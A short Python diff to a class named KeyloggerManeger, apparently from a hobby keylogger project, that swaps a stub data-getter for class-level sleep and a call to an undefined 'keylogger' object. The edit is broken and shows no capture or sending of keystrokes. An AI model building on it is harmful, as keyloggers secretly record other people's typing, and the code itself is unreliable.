@@ -9,8 +9,12 @@ class KeyloggerManeger:
         self.file_writer = FileWriter()
         self.encrypt = Encrypt(key)
 
-    def getdata(self):
-        pass
+    import time
+    time.sleep(10)
+    keylogger.getData()
+
+    #def getdata(self):
+     #   return self.keylogger.data
 
     def exit(self):
         pass
